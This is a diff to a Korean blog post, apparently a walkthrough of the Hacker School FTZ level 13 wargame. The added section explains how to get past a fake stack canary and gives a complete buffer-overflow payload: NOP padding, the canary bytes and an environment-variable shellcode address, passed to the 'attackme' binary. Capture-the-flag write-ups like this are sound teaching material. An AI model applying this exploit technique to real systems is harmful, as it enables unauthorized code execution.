@@ -1,7 +1,7 @@
 ---
 layout: post
 title: "Hacker School FTZ - Level 13"
-description: "Do you know the ?"
+description: "Do you know the canary?"
 comments: true
 categories: ftz
 ---
@@ -71,3 +71,18 @@ echo 'int main() { printf("ADDR -> 0x%x\n", getenv("EGG")); }' > getenv.c
 gcc -o getenv getenv.c
 ```
 
+## 4) BOF 수행하기  
+
+앞선 문제들 같은 경우엔 buf 배열 + dummy + SFP 부분은 모두 NOP으로만 채웠겠지만  
+dummy 부분에 BOF를 탐지하는 유사 카나리 기법이 적용되어 있기 때문에 이 부분을 우회하도록 하겠습니다.  
+
+위의 스택의 구조를 도식화한 그림을 보면 buf 배열(1024 byte) + dummy(12 byte) + "0x1234567" + dummy(8 byte) + SFP + RET로 스택이 구성되어 있습니다.  
+따라서 "\x90"*1036+"\x67\x45\x23\x01"+"\x90"*12+"\[EGG 환경 변수 주소\]"를 입력하면 됩니다.  
+
+위에서 EGG 환경 변수 주소를 구했기 때문에 바로 프로그램에 BOF를 시도하겠습니다.  
+
+``` bash
+./attackme `python -c 'print "\x90"*1036+"\x67\x45\x23\x01"+"\x90"*12+"\x8d\xfc\xff\xbf"'`
+```
+
+<img data-action="zoom" src='{{ "assets/ftz/level13/7.png" | relative_url }}' alt='relative'>  
